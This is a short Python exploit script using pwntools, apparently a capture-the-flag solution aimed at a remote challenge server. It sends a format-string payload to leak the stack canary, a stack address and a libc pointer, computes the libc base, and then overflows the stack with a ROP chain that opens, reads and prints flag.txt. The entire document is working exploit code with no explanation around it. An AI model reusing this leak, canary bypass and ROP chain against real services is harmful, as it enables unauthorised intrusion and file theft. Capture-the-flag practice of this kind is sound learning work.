from pwn import  * 



#p = process('./task_patched')
p=remote("34.72.15.9",1203)
libc=ELF('./libc.so.6')
elf=ELF('./task_patched')
rop = ROP('./libc.so.6')


p.recvuntil(b'message: ')
p.sendline(b"%p "*24)  #72 to reach the canry

#leak the canary and the  __libc_start_main+231 and the  saved rbp 
out =p.recv() 

canary  = p64(int(out.decode().split()[14] , 16 ) )
flag = p64(int(out.decode().split()[15] , 16 ) - (79) -16) 
libc_main_start = int(out.decode().split()[18] , 16 ) 


system =p64(libc_main_start + 186265)
libc_base = libc_main_start + 186265 - libc.sym['system']
libc.address = libc_base   


pop_rdi = p64(0x0002164f+libc_base)
pop_rsi = p64(0x0023a6a+libc_base)
pop_rdx = p64(0x00000000001b96+libc_base)
mov_rdx_rax = p64(0x000014145d +libc_base )
add_rdi_rdx = p64(0x00141044+libc_base)
#0x000000000014145d : mov rdx, rax ; ret
#0x0000000000141044 : add rdi, rdx ; mov qword ptr [r9], rdi ; ret
payload =  b'x./flag.txt\x00' +  b'a'*(72-12) +  canary+b'a'*8

payload+= pop_rdi + flag
payload+= pop_rsi + p64(0) 
payload+= p64(libc.sym['open']) 

payload+= pop_rdi + p64(0) 
payload += mov_rdx_rax
payload+= add_rdi_rdx
payload+= pop_rsi + flag
payload+= pop_rdx + p64(0x50)
payload+= p64(libc.sym['read']) 



payload+= pop_rdi + flag
payload+= p64(libc.sym['puts']) 




p.sendline(payload)

print(p.recv())

